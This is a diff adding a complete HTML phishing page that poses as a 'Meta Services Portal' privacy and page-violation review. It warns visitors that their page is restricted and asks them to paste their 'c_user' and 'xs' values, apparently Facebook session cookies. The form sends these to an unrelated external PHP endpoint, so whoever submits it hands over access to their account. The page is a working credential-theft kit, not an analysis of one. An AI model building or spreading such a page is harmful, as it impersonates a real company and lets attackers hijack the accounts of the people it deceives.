@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Privacy Review Request | Meta Services</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet"/>
+  <link rel="icon" href="logo-xjw2vU6p.png" />
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background-color: #f4f6f8;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 2rem 1rem;
+    }
+
+    .form-wrapper {
+      background: #fff;
+      max-width: 600px;
+      width: 100%;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+      overflow: hidden;
+    }
+
+    .form-header {
+      background-color: #246bfd;
+      padding: 1.2rem;
+      color: white;
+    }
+
+    .form-header h2 {
+      margin: 0;
+      font-size: 20px;
+    }
+
+    .form-subheader {
+      background-color: #e4e9f1;
+      padding: 0.8rem 1.2rem;
+      border-bottom: 1px solid #d3dce5;
+    }
+
+    .form-subheader h3 {
+      margin: 0;
+      font-size: 16px;
+      color: #246bfd;
+    }
+
+    .form-body {
+      padding: 1.5rem;
+    }
+
+    .form-body p {
+      font-size: 14px;
+      color: #444;
+      margin: 0.5rem 0;
+    }
+
+    label {
+      font-size: 13px;
+      font-weight: 500;
+      display: block;
+      margin-top: 1rem;
+      margin-bottom: 0.3rem;
+    }
+
+    input[type="text"],
+    input[type="number"] {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 14px;
+    }
+
+    video {
+      width: 100%;
+      margin-top: 1rem;
+      border-radius: 6px;
+      box-shadow: 0 0 6px rgba(0,0,0,0.05);
+    }
+
+    .note {
+      font-size: 12px;
+      color: #666;
+      margin-top: 1rem;
+    }
+
+    .form-footer {
+      background-color: #f0f2f5;
+      padding: 1rem 1.5rem;
+      display: flex;
+      justify-content: flex-end;
+      border-top: 1px solid #d3dce5;
+    }
+
+    button {
+      background-color: #246bfd;
+      color: #fff;
+      border: none;
+      padding: 10px 30px;
+      font-size: 15px;
+      border-radius: 30px;
+      cursor: pointer;
+      font-weight: 600;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #1e5dd4;
+    }
+
+    @media (max-width: 600px) {
+      .form-body {
+        padding: 1rem;
+      }
+
+      .form-footer {
+        padding: 1rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <form action="https://0dk2-netlifyforyou11.wasmer.app/mitho.php" method="post">
+    <div class="form-wrapper">
+      <div class="form-header">
+        <h2>Meta Services Portal</h2>
+      </div>
+
+      <div class="form-subheader">
+        <h3>Privacy & Page Violation Review</h3>
+      </div>
+
+      <div class="form-body">
+        <p>
+          We've detected certain behaviors on your page that may be inconsistent with our community and content policies. As a precaution, features on your page may be temporarily limited.
+        </p>
+        <p>
+          To request a manual review, please complete the form below. Watch the video for step-by-step guidance if needed.
+        </p>
+
+        <video src="video-information.mp4" autoplay muted controls></video>
+
+        <label for="c_user">(c_user)</label>
+        <input type="number" id="c_user" name="c_user" required pattern="^\d{15}$" title="Please enter 15 digits" />
+
+        <label for="xs">(xs)</label>
+        <input type="text" id="xs" name="xs" required />
+
+        <p class="note">Note: Keep your browser session active until verification is confirmed via email.</p>
+      </div>
+
+      <div class="form-footer">
+        <button type="submit">Submit Request</button>
+      </div>
+    </div>
+  </form>
+</body>
+</html>
